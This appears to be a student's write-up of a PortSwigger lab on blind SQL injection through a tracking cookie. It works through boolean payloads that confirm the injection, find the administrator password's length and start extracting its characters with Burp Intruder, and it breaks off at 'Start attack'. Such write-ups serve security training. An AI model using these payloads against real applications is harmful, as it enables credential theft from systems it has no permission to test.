# SQL Injection - Blind sqli with conditional response

# Vulnerability Overview 
    This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
    The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

# Steps to Reproduce

**Lab Link** --> https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

*Navigate to*
* /filter?category=Pets

*Confirm Injection point*
* Intercept the request (Burp)
* Send to repeter
* category=Pets' → No error or changes in site.
* Tracking Id= xyz'; → No error → Welcome back! massage disappered.
* Tracking Id= xyz'--; → Welcome back! massage re-appered. → Injection point confirmed.

*Confirm condition response*
* TrackingId=xyz' and 1=1-- → No change
* TrackingId=xyz' and 1=2-- → Welcome back! Massage disappered (Conditional response confirmed)
* TrackingId=' or 1=1 -- → Welcome back! Massage will only appear when condition is true.

*Extract the username*
* TrackingId=' or (select 'a')='a; → No change
* TrackingId=' or (select 'a' from users where username='administrator')='a → No change

*Confirm Password length*
* TrackingId=' or (select 'a' from users where username='administrator' and length(password)>19)='a → No change
* TrackingId=' or (select 'a' from users where username='administrator' and length(password)>20)='a → Welcome back! disappered → condition is false → password length is 20 characters

*Extract password*
* TrackingId=' or (select substring(password,1,1) from users where username='administrator')='a → Welcome back! disappered → false condition → first caracter of password is not a
* Send request to intruder (Ctrl+i) → select sniper attack → select a and click on add 
* add payload items a-z and 0-9 
* Click setting → Scroll to Grep-Extract → Click on box → Click on Add → search welcome → select welcome back! → click OK  → Start attack
* 